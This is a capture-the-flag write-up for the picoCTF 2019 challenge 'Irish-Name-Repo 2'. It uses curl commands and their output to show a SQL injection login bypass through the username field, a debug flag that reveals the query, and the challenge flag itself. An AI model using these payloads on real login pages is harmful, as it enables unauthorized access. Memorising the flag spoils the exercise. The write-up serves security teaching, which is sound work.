# Irish-Name-Repo 2
Web Exploitation, 350 points

## Description:
> There is a website running at https://2019shell1.picoctf.com/problem/60775/. Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! 


## Solution: 


The website offered an admin login page:

```html
<form action="login.php" method="POST">
    <fieldset>
        <div class="form-group">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" class="form-control">
        </div>
        <div class="form-group">
            <label for="password">Password:</label>
            <div class="controls">
                <input type="password" id="password" name="password" class="form-control">
            </div>
        </div>
        <input type="hidden" name="debug" value="0">

        <div class="form-actions">
            <input type="submit" value="Login" class="btn btn-primary">
        </div>
    </fieldset>
</form>
```

The solution from the [previous challenge](Irish-Name-Repo_1.md) didn't work anymore:
```console
root@kali:/media/sf_CTFs/pico/Irish-Name-Repo_2# curl "https://2019shell1.picoctf.com/problem/60775/login.php" --data "username=admin&password='+or+1=1--" && echo
<h1>SQLi detected.</h1>
```

However, attacking the `login` field instead of the `password` field allowed bypassing the authentication logic:
```console
root@kali:/media/sf_CTFs/pico/Irish-Name-Repo_2# curl "https://2019shell1.picoctf.com/problem/60775/login.php" --data "username=admin'--&password=1" && echo
<h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_015815e2}</p>
```

It was also possible to set the `debug` parameter in order to inspect the SQL statement:
```console
root@kali:/media/sf_CTFs/pico/Irish-Name-Repo_2# curl "https://2019shell1.picoctf.com/problem/60775/login.php" --data "username=admin'--&password=1&debug=1" && echo
<pre>username: admin'--
password: 1
SQL query: SELECT * FROM users WHERE name='admin'--' AND password='1'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_015815e2}</p>
```

